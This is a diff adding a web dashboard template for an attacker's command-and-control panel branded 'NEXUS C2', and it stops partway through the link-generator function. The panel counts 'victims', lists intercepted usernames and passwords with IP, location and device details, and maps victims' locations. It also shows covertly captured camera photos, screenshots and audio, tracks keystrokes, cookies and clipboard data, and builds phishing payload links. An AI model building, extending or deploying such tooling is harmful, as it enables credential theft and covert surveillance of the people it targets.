@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXUS C2 • ELITE CONTROL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            background: radial-gradient(circle at top left, #0f172a, #020617); 
+            color: #f8fafc; font-family: 'Space Grotesk', sans-serif; min-height: 100vh;
+        }
+        .glass { background: rgba(30, 41, 59, 0.4); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .nav-active { background: rgba(59, 130, 246, 0.2) !important; color: #60a5fa !important; border-left: 4px solid #3b82f6; }
+        .pulse-online { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .mobile-drawer { transition: transform 0.3s ease-in-out; transform: translateX(-100%); }
+        .drawer-open { transform: translateX(0); }
+        .blur-sm { filter: blur(4px); transition: all 0.3s; }
+        .blur-sm:hover { filter: blur(0); }
+        .captured-item { 
+            cursor: pointer; 
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        .captured-item:hover { transform: scale(1.05); border-color: #3b82f6; }
+        .captured-item img, .captured-item audio { width: 100%; border-radius: 8px; }
+        .captured-item .badge {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: rgba(0,0,0,0.7);
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 9px;
+            color: #60a5fa;
+            border: 1px solid #3b82f6;
+        }
+        #map { height: 500px; border-radius: 16px; border: 1px solid #1e293b; }
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal-content {
+            max-width: 90vw;
+            max-height: 90vh;
+            background: #0f172a;
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid #3b82f6;
+            position: relative;
+        }
+        .modal-content img, .modal-content audio, .modal-content video {
+            max-width: 100%;
+            max-height: 70vh;
+            border-radius: 8px;
+        }
+        .modal-close {
+            position: absolute;
+            top: -12px;
+            right: -12px;
+            background: #ef4444;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            font-size: 18px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-close:hover { background: #dc2626; }
+        .modal-meta {
+            color: #94a3b8;
+            font-size: 11px;
+            margin-top: 12px;
+            padding: 12px;
+            background: rgba(30,41,59,0.5);
+            border-radius: 8px;
+            font-family: monospace;
+        }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 10px; }
+        .ymaps-2-1-79-map { border-radius: 16px !important; }
+    </style>
+</head>
+<body>
+    <!-- Toast -->
+    <div id="toast" class="invisible fixed z-[100] left-1/2 -translate-x-1/2 bottom-10 bg-blue-600 px-6 py-2 rounded-full font-bold shadow-xl transition-all duration-300 text-sm">System Alert</div>
+
+    <!-- Mobile Header -->
+    <div class="lg:hidden flex items-center justify-between p-4 glass sticky top-0 z-[60]">
+        <div class="text-xl font-bold italic">NEXUS<span class="text-blue-500">C2</span></div>
+        <button onclick="toggleDrawer(true)" class="p-2 text-blue-500">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" /></svg>
+        </button>
+    </div>
+
+    <!-- Sidebar -->
+    <aside id="sidebar" class="mobile-drawer lg:translate-x-0 fixed inset-y-0 left-0 w-64 glass border-r border-slate-800 z-[70] flex flex-col p-6 lg:h-full">
+        <div class="flex items-center justify-between mb-10">
+            <div class="text-2xl font-bold italic">NEXUS<span class="text-blue-500">C2</span></div>
+            <button onclick="toggleDrawer(false)" class="lg:hidden text-slate-400">✕</button>
+        </div>
+        <nav class="space-y-2 flex-1 overflow-y-auto">
+            <button onclick="showTab('stats')" class="nav-btn w-full text-left p-4 rounded-xl text-[10px] font-bold uppercase flex items-center gap-3 nav-active" data-tab="stats">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg> Command View
+            </button>
+            <button onclick="showTab('map')" class="nav-btn w-full text-left p-4 rounded-xl text-[10px] font-bold uppercase flex items-center gap-3" data-tab="map">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg> Live Map
+            </button>
+            <button onclick="showTab('timeline')" class="nav-btn w-full text-left p-4 rounded-xl text-[10px] font-bold uppercase flex items-center gap-3" data-tab="timeline">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 8v4l3 3"/><circle cx="12" cy="12" r="10"/></svg> Timeline
+            </button>
+            <button onclick="showTab('logs')" class="nav-btn w-full text-left p-4 rounded-xl text-[10px] font-bold uppercase flex items-center gap-3" data-tab="logs">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V9z"/><path d="M13 2v7h7"/></svg> Live Intercepts
+            </button>
+            <button onclick="showTab('captured')" class="nav-btn w-full text-left p-4 rounded-xl text-[10px] font-bold uppercase flex items-center gap-3" data-tab="captured">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="2.18"/><line x1="8" y1="2" x2="8" y2="22"/><line x1="16" y1="2" x2="16" y2="22"/><line x1="2" y1="8" x2="22" y2="8"/><line x1="2" y1="16" x2="22" y2="16"/></svg> Captured
+            </button>
+            <button onclick="showTab('templates')" class="nav-btn w-full text-left p-4 rounded-xl text-[10px] font-bold uppercase flex items-center gap-3" data-tab="templates">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg> Assets Folder
+            </button>
+            <button onclick="showTab('generator')" class="nav-btn w-full text-left p-4 rounded-xl text-[10px] font-bold uppercase flex items-center gap-3" data-tab="generator">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg> Deployment
+            </button>
+            <button onclick="showTab('profile')" class="nav-btn w-full text-left p-4 rounded-xl text-[10px] font-bold uppercase flex items-center gap-3" data-tab="profile">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg> Operator Profile
+            </button>
+        </nav>
+        <a href="/logout" class="p-4 bg-red-500/10 text-red-500 rounded-xl text-[10px] font-bold uppercase hover:bg-red-500 hover:text-white transition mt-auto text-center">Terminate Link</a>
+    </aside>
+
+    <div id="overlay" onclick="toggleDrawer(false)" class="hidden fixed inset-0 bg-black/60 z-[65] backdrop-blur-sm"></div>
+
+    <!-- Main Content -->
+    <main class="lg:ml-64 p-4 md:p-10 pb-20">
+        <!-- STATS -->
+        <div id="section-stats" class="tab-content active">
+            <header class="flex justify-between items-center mb-8">
+                <div><h2 class="text-3xl font-bold uppercase tracking-tighter">Command Overview</h2></div>
+                <div class="flex gap-2">
+                    <button onclick="exportReport('csv')" class="text-[9px] bg-green-500/20 text-green-400 px-3 py-1.5 rounded border border-green-500/30 font-bold uppercase hover:bg-green-500/30 transition">Export CSV</button>
+                    <button onclick="exportReport('pdf')" class="text-[9px] bg-purple-500/20 text-purple-400 px-3 py-1.5 rounded border border-purple-500/30 font-bold uppercase hover:bg-purple-500/30 transition">Export PDF</button>
+                    <div class="pulse-online"></div>
+                </div>
+            </header>
+
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-3 md:gap-4">
+                <div class="glass p-4 md:p-6 rounded-2xl border-b-2 border-blue-500 text-center">
+                    <p class="text-[8px] md:text-[9px] text-slate-500 uppercase font-bold">Total Victims</p>
+                    <h2 class="text-2xl md:text-4xl font-bold mt-1" id="stat-total"><%= total %></h2>
+                </div>
+                <div class="glass p-4 md:p-6 rounded-2xl border-b-2 border-purple-500 text-center">
+                    <p class="text-[8px] md:text-[9px] text-slate-500 uppercase font-bold">Last 24 Hours</p>
+                    <h2 class="text-2xl md:text-4xl font-bold mt-1 text-purple-400" id="stat-24h"><%= last24h %></h2>
+                </div>
+                <div class="glass p-4 md:p-6 rounded-2xl border-b-2 border-orange-500 text-center">
+                    <p class="text-[8px] md:text-[9px] text-slate-500 uppercase font-bold">Live Active</p>
+                    <h2 class="text-2xl md:text-4xl font-bold mt-1 text-orange-400" id="stat-live">0</h2>
+                </div>
+                <div class="glass p-4 md:p-6 rounded-2xl border-b-2 border-green-500 text-center">
+                    <p class="text-[8px] md:text-[9px] text-slate-500 uppercase font-bold">Conversion Rate</p>
+                    <h2 class="text-2xl md:text-4xl font-bold mt-1 text-green-400" id="stat-conversion">0%</h2>
+                </div>
+            </div>
+
+            <div class="glass p-6 rounded-3xl h-80"><canvas id="hitChart"></canvas></div>
+        </div>
+
+        <!-- MAP (Yandex Maps) -->
+        <div id="section-map" class="tab-content hidden">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-xl font-bold uppercase text-blue-500">Live Map View (Yandex)</h2>
+                <button onclick="refreshYandexMap()" class="text-[9px] bg-blue-500/20 text-blue-400 px-3 py-1.5 rounded border border-blue-500/30 font-bold uppercase">Refresh</button>
+            </div>
+            <div id="map" style="height:500px; border-radius:16px; border:1px solid #1e293b; background:#0f172a;"></div>
+            <p class="text-[10px] text-slate-500 mt-2 text-center">📍 Red markers show victim locations (IP-based geolocation)</p>
+        </div>
+
+        <!-- TIMELINE -->
+        <div id="section-timeline" class="tab-content hidden">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-xl font-bold uppercase text-blue-500">Device Timeline</h2>
+                <button onclick="refreshTimeline()" class="text-[9px] bg-blue-500/20 text-blue-400 px-3 py-1.5 rounded border border-blue-500/30 font-bold uppercase">Refresh</button>
+            </div>
+            <div id="timeline-container" class="space-y-4">
+                <div class="text-slate-500 text-center py-10">Loading timelines...</div>
+            </div>
+        </div>
+
+        <!-- LOGS -->
+        <div id="section-logs" class="tab-content">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-xl font-bold uppercase text-blue-500">Live Intercepts</h2>
+                <div class="flex gap-2">
+                    <button onclick="refreshLogs()" class="text-[9px] bg-blue-500/20 text-blue-400 px-3 py-1.5 rounded border border-blue-500/30 font-bold uppercase">Refresh</button>
+                    <button onclick="clearAllLogs()" class="text-[9px] bg-red-500/20 text-red-400 px-3 py-1.5 rounded border border-red-500/30 font-bold uppercase">Wipe DB</button>
+                </div>
+            </div>
+            <div class="glass rounded-2xl overflow-x-auto border border-slate-800">
+                <table class="w-full text-left">
+                    <thead>
+                        <tr class="text-[10px] uppercase text-slate-500 border-b border-slate-800">
+                            <th class="p-4">Platform</th>
+                            <th class="p-4">Identity</th>
+                            <th class="p-4">Data</th>
+                            <th class="p-4">IP Address</th>
+                            <th class="p-4">Location</th>
+                            <th class="p-4">Device Info</th>
+                            <th class="p-4">Timestamp</th>
+                            <th class="p-4">Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="log-table" class="text-[11px] font-mono divide-y divide-slate-800/50">
+                        <% logs.forEach(log => { %>
+                            <tr class="hover:bg-slate-800/30 transition">
+                                <td class="p-4"><span class="text-blue-400 font-bold"><%= log.site || 'NEXUS' %></span></td>
+                                <td class="p-4 text-slate-300"><%= log.username || '---' %></td>
+                                <td class="p-4 text-red-400 blur-sm"><%= log.password || '---' %></td>
+                                <td class="p-4 text-slate-500"><%= log.ip || '0.0.0.0' %></td>
+                                <td class="p-4 text-slate-500"><%= log.location || 'Unknown' %></td>
+                                <td class="p-4 text-slate-500 text-[9px]"><%= log.device || 'Unknown' %></td>
+                                <td class="p-4 text-slate-500 text-[10px]"><%= new Date(log.timestamp).toLocaleString() %></td>
+                                <td class="p-4"><button onclick="deleteLog('<%= log.id %>')" class="text-red-500 hover:text-white">✕</button></td>
+                            </tr>
+                        <% }) %>
+                        <% if (logs.length === 0) { %>
+                            <tr><td colspan="8" class="p-8 text-center text-slate-500">No intercepts yet</td></tr>
+                        <% } %>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- CAPTURED -->
+        <div id="section-captured" class="tab-content">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-xl font-bold uppercase text-blue-500">Captured Gallery</h2>
+                <button onclick="refreshCaptured()" class="text-[9px] bg-blue-500/20 text-blue-400 px-3 py-1.5 rounded border border-blue-500/30 font-bold uppercase">Refresh</button>
+            </div>
+            <div id="captured-grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
+                <div class="text-slate-500 col-span-full text-center py-10">Loading captures...</div>
+            </div>
+        </div>
+
+        <!-- TEMPLATES -->
+        <div id="section-templates" class="tab-content">
+            <h2 class="text-xl font-bold uppercase text-blue-500 mb-6">Asset Management</h2>
+            <div id="template-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                <% templates.forEach(tpl => { %>
+                    <div class="glass p-6 rounded-2xl border border-slate-800">
+                        <h4 class="text-lg font-bold"><%= tpl.name %></h4>
+                        <button onclick="useTemplate('<%= tpl.file %>')" class="mt-4 w-full py-2 bg-slate-800 hover:bg-blue-600 rounded-xl text-[9px] font-bold uppercase transition">Select</button>
+                    </div>
+                <% }) %>
+            </div>
+        </div>
+
+        <!-- GENERATOR -->
+        <div id="section-generator" class="tab-content">
+            <div class="max-w-xl mx-auto glass p-8 rounded-3xl space-y-6 border-t-2 border-blue-500">
+                <h2 class="text-xl font-bold text-blue-500 uppercase text-center italic tracking-widest">Build Link</h2>
+                <div class="space-y-4">
+                    <select id="template-select" class="w-full p-4 rounded-xl bg-slate-900 border border-slate-800 outline-none focus:border-blue-500 text-sm">
+                        <% templates.forEach(tpl => { %>
+                            <option value="<%= tpl.file %>"><%= tpl.name %></option>
+                        <% }) %>
+                    </select>
+                    <input type="text" id="redirect-url" class="w-full p-4 rounded-xl bg-slate-900 border border-slate-800 outline-none focus:border-blue-500 text-sm" placeholder="Redirect to: https://google.com" value="https://google.com">
+                    <button onclick="generateLink()" class="w-full py-4 bg-blue-600 rounded-xl font-bold uppercase text-xs tracking-widest transition-all">Generate Payload</button>
+                </div>
+                <div id="link-output" class="hidden p-6 bg-black/40 border border-dashed border-blue-500 rounded-2xl text-center">
+                    <code id="final-link" class="text-[10px] break-all text-blue-300 font-mono"></code>
+                    <button onclick="copyLink()" class="w-full mt-4 py-2 bg-blue-500/20 text-blue-400 rounded-lg text-[10px] font-bold uppercase">Copy Link</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PROFILE -->
+        <div id="section-profile" class="tab-content">
+            <div class="max-w-2xl mx-auto space-y-6">
+                <div class="glass p-8 rounded-3xl border-t-2 border-blue-500">
+                    <h2 class="text-xl font-bold text-blue-500 uppercase text-center italic mb-8 tracking-widest">Operator Settings</h2>
+                    <div class="grid md:grid-cols-2 gap-6">
+                        <div class="space-y-4">
+                            <div>
+                                <label class="text-[9px] uppercase font-bold text-slate-500 ml-1">Username</label>
+                                <p class="p-4 rounded-xl bg-slate-900 border border-slate-800 text-sm"><%= user.username %></p>
+                            </div>
+                            <div>
+                                <label class="text-[9px] uppercase font-bold text-slate-500 ml-1">Full Name</label>
+                                <p class="p-4 rounded-xl bg-slate-900 border border-slate-800 text-sm"><%= user.name %></p>
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-1 gap-3">
+                            <div class="glass p-4 rounded-2xl border border-slate-800 flex flex-col justify-center items-center">
+                                <p class="text-[8px] text-slate-500 uppercase font-bold">Lifetime Victims</p>
+                                <h3 class="text-2xl font-bold text-blue-400"><%= total %></h3>
+                            </div>
+                            <div class="glass p-4 rounded-2xl border border-slate-800 flex flex-col justify-center items-center">
+                                <p class="text-[8px] text-slate-500 uppercase font-bold">Last 24 Hours</p>
+                                <h3 class="text-2xl font-bold text-purple-400"><%= last24h %></h3>
+                            </div>
+                            <div class="glass p-4 rounded-2xl border border-slate-800 flex flex-col justify-center items-center">
+                                <p class="text-[8px] text-slate-500 uppercase font-bold">Links Generated</p>
+                                <h3 class="text-2xl font-bold text-green-400"><%= linkCount %></h3>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mt-8 pt-6 border-t border-slate-800 text-center text-xs text-slate-500">
+                        Logged in as <span class="text-blue-400"><%= user.username %></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Modal for viewing captured items -->
+    <div id="capture-modal" class="hidden modal-overlay" onclick="closeModal(event)">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <button class="modal-close" onclick="closeModal()">✕</button>
+            <div id="modal-body"></div>
+            <div id="modal-meta" class="modal-meta"></div>
+            <button onclick="downloadModalContent()" class="mt-4 w-full py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-xs font-bold uppercase transition">⬇ Download</button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // GLOBAL
+        // ============================================================
+        let mapInstance = null;
+        let mapMarkers = [];
+        let currentModalData = null;
+
+        // ============================================================
+        // UI FUNCTIONS
+        // ============================================================
+        function toggleDrawer(open) {
+            document.getElementById('sidebar').classList.toggle('drawer-open', open);
+            document.getElementById('overlay').classList.toggle('hidden', !open);
+        }
+
+        function showTab(id) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('nav-active'));
+            const activeBtn = document.querySelector(`[data-tab="${id}"]`);
+            if(activeBtn) activeBtn.classList.add('nav-active');
+            document.getElementById('section-' + id).classList.add('active');
+            toggleDrawer(false);
+            
+            if(id === 'captured') refreshCaptured();
+            if(id === 'logs') refreshLogs();
+            if(id === 'map') initYandexMap();
+            if(id === 'timeline') refreshTimeline();
+        }
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg;
+            t.classList.remove('invisible');
+            setTimeout(() => t.classList.add('invisible'), 3000);
+        }
+
+        function exportReport(type) {
+            window.location.href = `/api/export/${type}`;
+            showToast(`Exporting ${type.toUpperCase()}...`);
+        }
+
+        // ============================================================
+        // YANDEX MAPS (FREE - NO API KEY NEEDED)
+        // ============================================================
+        function initYandexMap() {
+            const container = document.getElementById('map');
+            
+            // Load Yandex Maps API dynamically
+            if (typeof ymaps === 'undefined') {
+                const script = document.createElement('script');
+                script.src = 'https://api-maps.yandex.ru/2.1/?apikey=&lang=en_US';
+                script.onload = () => {
+                    ymaps.ready(() => createYandexMap());
+                };
+                script.onerror = () => {
+                    container.innerHTML = '<div class="text-slate-500 text-center py-10">⚠️ Failed to load Yandex Maps. Please try again.</div>';
+                };
+                document.head.appendChild(script);
+            } else {
+                ymaps.ready(() => createYandexMap());
+            }
+        }
+
+        function createYandexMap() {
+            const container = document.getElementById('map');
+            try {
+                if (mapInstance) {
+                    mapInstance.destroy();
+                }
+                
+                mapInstance = new ymaps.Map(container, {
+                    center: [20, 0],
+                    zoom: 2,
+                    controls: ['zoomControl', 'typeSelector', 'fullscreenControl']
+                });
+
+                // Load markers
+                fetch('/api/map')
+                    .then(res => res.json())
+                    .then(data => {
+                        mapMarkers.forEach(m => mapInstance.geoObjects.remove(m));
+                        mapMarkers = [];
+
+                        data.forEach(victim => {
+                            if (victim.lat && victim.lng) {
+                                const placemark = new ymaps.Placemark(
+                                    [victim.lat, victim.lng],
+                                    {
+                                        balloonContent: `
+                                            <div style="color:#000;font-size:12px;padding:5px;">
+                                                <strong>${victim.site || 'NEXUS'}</strong><br>
+                                                📍 ${victim.location || 'Unknown'}<br>
+                                                📱 ${victim.device || 'Unknown'}<br>
+                                                🕐 ${new Date(victim.timestamp).toLocaleString()}
+                                            </div>
+                                        `,
+                                        hintContent: victim.location || 'Unknown'
+                                    },
+                                    {
+                                        preset: 'islands#redDotIcon',
+                                        iconColor: '#ef4444'
+                                    }
+                                );
+                                mapInstance.geoObjects.add(placemark);
+                                mapMarkers.push(placemark);
+                            }
+                        });
+                    });
+            } catch(e) {
+                console.error('Yandex Map error:', e);
+                container.innerHTML = '<div class="text-slate-500 text-center py-10">⚠️ Error loading map</div>';
+            }
+        }
+
+        function refreshYandexMap() {
+            if (mapInstance) {
+                mapInstance.geoObjects.removeAll();
+                mapMarkers = [];
+                createYandexMap();
+                showToast('Map refreshed');
+            } else {
+                initYandexMap();
+            }
+        }
+
+        // ============================================================
+        // LOGS (Fixed IP, Location, Device)
+        // ============================================================
+        async function refreshLogs() {
+            try {
+                const res = await fetch('/api/logs');
+                const logs = await res.json();
+                const tbody = document.getElementById('log-table');
+                if(logs.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="8" class="p-8 text-center text-slate-500">No intercepts yet</td></tr>';
+                    return;
+                }
+                tbody.innerHTML = logs.map(log => `
+                    <tr class="hover:bg-slate-800/30 transition">
+                        <td class="p-4"><span class="text-blue-400 font-bold">${log.site || 'NEXUS'}</span></td>
+                        <td class="p-4 text-slate-300">${log.username || '---'}</td>
+                        <td class="p-4 text-red-400 blur-sm">${log.password || '---'}</td>
+                        <td class="p-4 text-slate-500">${log.ip || '0.0.0.0'}</td>
+                        <td class="p-4 text-slate-500">${log.location || 'Unknown'}</td>
+                        <td class="p-4 text-slate-500 text-[9px]">${log.device || 'Unknown'}</td>
+                        <td class="p-4 text-slate-500 text-[10px]">${new Date(log.timestamp).toLocaleString()}</td>
+                        <td class="p-4"><button onclick="deleteLog('${log.id}')" class="text-red-500 hover:text-white">✕</button></td>
+                    </tr>
+                `).join('');
+            } catch(e) {
+                console.error('Refresh logs error:', e);
+            }
+        }
+
+        async function deleteLog(id) {
+            if(!confirm('Remove this entry?')) return;
+            try {
+                await fetch(`/api/logs/${id}`, { method: 'DELETE' });
+                refreshLogs();
+                updateStats();
+            } catch(e) {
+                showToast('Error deleting log');
+            }
+        }
+
+        async function clearAllLogs() {
+            if(!confirm('Wipe entire database? This cannot be undone!')) return;
+            try {
+                await fetch('/api/logs', { method: 'DELETE' });
+                refreshLogs();
+                updateStats();
+                showToast('All logs cleared');
+            } catch(e) {
+                showToast('Error clearing logs');
+            }
+        }
+
+        // ============================================================
+        // CAPTURED (With Modal + Download)
+        // ============================================================
+        async function refreshCaptured() {
+            try {
+                const res = await fetch('/api/captures');
+                const captures = await res.json();
+                const grid = document.getElementById('captured-grid');
+                if(captures.length === 0) {
+                    grid.innerHTML = '<div class="text-slate-500 col-span-full text-center py-10">No captures yet</div>';
+                    return;
+                }
+                grid.innerHTML = captures.map(c => {
+                    const isAudio = c.type === 'audio';
+                    const isImage = ['front', 'back', 'screenshot'].includes(c.type);
+                    const icon = isAudio ? '🎵' : isImage ? '🖼️' : '📄';
+                    return `
+                        <div class="captured-item glass p-3 rounded-2xl border border-slate-800" onclick="viewCapture('${c.id}')">
+                            ${isImage ? `<img src="/captures/${c.filename}" class="captured-img" onerror="this.style.display='none'" />` : ''}
+                            ${isAudio ? `<audio src="/captures/${c.filename}" controls style="width:100%;"></audio>` : ''}
+                            ${!isImage && !isAudio ? `<div class="text-center py-4 text-slate-500">${icon} ${c.type}</div>` : ''}
+                            <div class="badge">${c.type || 'unknown'}</div>
+                            <p class="text-[8px] text-slate-500 mt-2 text-center">${new Date(c.timestamp).toLocaleString()}</p>
+                        </div>
+                    `;
+                }).join('');
+            } catch(e) {
+                console.error('Refresh captured error:', e);
+            }
+        }
+
+        async function viewCapture(id) {
+            try {
+                const res = await fetch(`/api/captures/${id}`);
+                const data = await res.json();
+                if (!data) return showToast('Item not found');
+                
+                currentModalData = data;
+                const modal = document.getElementById('capture-modal');
+                const body = document.getElementById('modal-body');
+                const meta = document.getElementById('modal-meta');
+                
+                const isAudio = data.type === 'audio';
+                const isImage = ['front', 'back', 'screenshot'].includes(data.type);
+                
+                if (isImage) {
+                    body.innerHTML = `<img src="/captures/${data.filename}" alt="${data.type}" />`;
+                } else if (isAudio) {
+                    body.innerHTML = `<audio src="/captures/${data.filename}" controls autoplay style="width:100%;"></audio>`;
+                } else {
+                    body.innerHTML = `<div class="text-center py-10 text-slate-500">${data.type} file</div>`;
+                }
+                
+                meta.innerHTML = `
+                    <strong>📋 Metadata</strong><br>
+                    ID: ${data.id}<br>
+                    Type: ${data.type || 'Unknown'}<br>
+                    Filename: ${data.filename}<br>
+                    Timestamp: ${new Date(data.timestamp).toLocaleString()}<br>
+                    Victim ID: ${data.victimId || 'N/A'}<br>
+                    ${data.ip ? `IP: ${data.ip}` : ''}
+                `;
+                
+                modal.classList.remove('hidden');
+            } catch(e) {
+                showToast('Error loading capture');
+            }
+        }
+
+        function downloadModalContent() {
+            if (!currentModalData) return;
+            const filename = currentModalData.filename;
+            const link = document.createElement('a');
+            link.href = `/captures/${filename}`;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            showToast('Downloading...');
+        }
+
+        function closeModal(e) {
+            if (e && e.target !== e.currentTarget) return;
+            document.getElementById('capture-modal').classList.add('hidden');
+            currentModalData = null;
+            document.getElementById('modal-body').innerHTML = '';
+            document.getElementById('modal-meta').innerHTML = '';
+        }
+
+        // ============================================================
+        // TIMELINE (Fixed Display)
+        // ============================================================
+        async function refreshTimeline() {
+            try {
+                const container = document.getElementById('timeline-container');
+                container.innerHTML = '<div class="text-slate-500 text-center py-10">Loading timelines...</div>';
+                
+                const res = await fetch('/api/timelines');
+                const data = await res.json();
+                
+                if (data.length === 0) {
+                    container.innerHTML = '<div class="text-slate-500 text-center py-10">No timeline data available yet</div>';
+                    return;
+                }
+
+                container.innerHTML = data.map(v => {
+                    const deviceName = v.deviceInfo?.platform || v.deviceInfo?.userAgent?.split('(')[1]?.split(')')[0] || 'Unknown';
+                    const battery = v.batteryInfo?.level || 'Unknown';
+                    const location = v.location || 'Unknown';
+                    
+                    return `
+                        <div class="glass p-6 rounded-2xl border border-slate-800 hover:border-blue-500/50 transition">
+                            <div class="flex justify-between items-center flex-wrap gap-2">
+                                <h3 class="font-bold text-blue-400 text-sm">${v.id.substring(0, 12)}...</h3>
+                                <span class="text-xs text-slate-500">${new Date(v.timestamp).toLocaleString()}</span>
+                            </div>
+                            <div class="grid grid-cols-2 md:grid-cols-4 gap-2 mt-2 text-xs">
+                                <span class="text-slate-300">📱 ${deviceName}</span>
+                                <span class="text-slate-300">🔋 ${battery}</span>
+                                <span class="text-slate-300">📍 ${location}</span>
+                                <span class="text-slate-300">📸 ${v.hasFrontImage ? 'Front ✅' : ''} ${v.hasBackImage ? 'Back ✅' : ''}</span>
+                            </div>
+                            <div class="mt-2 text-[10px] text-slate-500 flex gap-4 flex-wrap">
+                                <span>📋 Events: ${v.events?.length || 0}</span>
+                                <span>⌨️ Keystrokes: ${v.keystrokes?.length || 0}</span>
+                                <span>🍪 Cookies: ${v.cookies ? '✅' : '❌'}</span>
+                                <span>📋 Clipboard: ${v.clipboardData ? '✅' : '❌'}</span>
+                                <span>🎤 Audio: ${v.hasAudio ? '✅' : '❌'}</span>
+                                <span>🖥️ Screenshot: ${v.hasScreenshot ? '✅' : '❌'}</span>
+                            </div>
+                            <button onclick="showTimelineDetail('${v.id}')" class="mt-2 text-blue-400 text-xs hover:text-blue-300 transition">
+                                🔍 View Details
+                            </button>
+                        </div>
+                    `;
+                }).join('');
+            } catch(e) {
+                console.error('Timeline error:', e);
+                document.getElementById('timeline-container').innerHTML = '<div class="text-red-500 text-center py-10">Error loading timeline</div>';
+            }
+        }
+
+        async function showTimelineDetail(id) {
+            try {
+                const res = await fetch(`/api/timeline/${id}`);
+                const data = await res.json();
+                const output = JSON.stringify(data, null, 2);
+                const modal = document.createElement('div');
+                modal.className = 'fixed inset-0 bg-black/80 z-[100] flex items-center justify-center p-4';
+                modal.innerHTML = `
+                    <div class="glass p-6 rounded-2xl max-w-2xl w-full max-h-[80vh] overflow-y-auto">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="text-blue-400 font-bold">Timeline Details</h3>
+                            <button onclick="this.parentElement.parentElement.parentElement.remove()" class="text-slate-500 hover:text-white text-xl">✕</button>
+                        </div>
+                        <pre class="text-[10px] text-slate-300 whitespace-pre-wrap">${output}</pre>
+                    </div>
+                `;
+                document.body.appendChild(modal);
+            } catch(e) {
+                showToast('Error loading timeline details');
+            }
+        }
+
+        // ============================================================
+        // TEMPLATES
+        // ============================================================
+        function useTemplate(file) {
+            document.getElementById('template-select').value = file;
+            showTab('generator');
+        }
+
+        // ============================================================
+        // GENERATOR
+        // ============================================================
+        async function generateLink() {
